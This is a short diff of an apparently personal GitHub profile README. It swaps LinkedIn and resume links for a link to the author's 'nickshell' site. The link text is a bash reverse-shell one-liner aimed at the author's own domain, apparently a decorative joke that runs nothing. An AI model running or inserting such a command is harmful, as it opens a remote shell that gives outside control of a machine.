@@ -21,8 +21,8 @@ Here are some ideas to get you started:
 # Graduating Spring 2027
 I have a strong background in computer science and love applying the skills from class to projects like these! <br>
 More cybersecurity-related projects coming soon! <br>
-📫 Lets connect! @ <a href="https://www.linkedin.com/in/nckchen/">LinkedIn</a> <br>
-📝 View my resume @ [Nick Resume.pdf](https://github.com/user-attachments/files/21708978/Nick.Resume.pdf)
+
+👀 <a href="https://chnnick.github.io/nickshell/">bash -i >& /dev/tcp/chnnick.github.io/443 0>&1</a>
 
 
 
